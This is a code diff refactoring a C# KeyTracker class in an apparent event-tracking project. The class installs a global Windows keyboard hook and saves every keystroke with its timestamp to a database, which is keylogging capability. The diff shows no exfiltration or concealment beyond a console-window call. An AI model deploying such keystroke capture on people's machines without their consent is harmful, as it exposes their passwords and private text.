@@ -11,9 +11,9 @@ using EventTracker.Model;
 
 namespace EventTracker.Trackers
 {
-    class KeyTracker
+    public class KeyTracker : BaseEventTracker
     {
-        public static void Start()
+        public override void Start()
         {
             var handle = GetConsoleWindow();
 
@@ -23,7 +23,7 @@ namespace EventTracker.Trackers
             _hookID = SetHook(_proc);
         }
 
-        public static void Stop()
+        public override void Stop()
         {
             UnhookWindowsHookEx(_hookID);
         }
@@ -99,16 +99,11 @@ namespace EventTracker.Trackers
             string key = KeyHelpers.ReadKeyCode(vkCode);
             try
             {
-                using (EventTrackerContext context = new EventTrackerContext())
+                EventTrackerContext.Save(new KeyStroke()
                 {
-                    var keyStroke = new KeyStroke()
-                    {
-                        EventTime = DateTime.Now,
-                        Key = key,
-                    };
-                    context.KeyStrokes.Add(keyStroke);
-                    context.SaveChanges();
-                }
+                    EventTime = DateTime.Now,
+                    Key = key,
+                });
             }
             catch (Exception ex1)
             {
